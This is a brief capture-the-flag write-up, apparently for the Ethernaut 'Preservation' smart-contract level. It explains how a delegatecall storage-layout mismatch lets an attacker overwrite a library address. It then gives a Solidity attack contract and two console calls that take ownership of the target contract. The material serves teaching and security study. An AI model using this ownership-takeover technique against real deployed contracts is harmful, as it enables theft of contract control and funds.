the memory layout of the `LibraryContract` is incompatible with the contract `Preservation`, `setTime` will write to the first memory slot, thus overwriting `timeZone1Library` address. So, first deploy a contract that will change the owner, then call `setFirstTime` to override the `timeZone1Library` with our contract address, lastly `setFirstTime` with our address.

```
contract HackPreservation {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;

  function setTime(uint _time) public {
    owner = address(_time);
  }
}
```

```
await contract.setFirstTime('<contract address>')
await contract.setFirstTime(player)
```
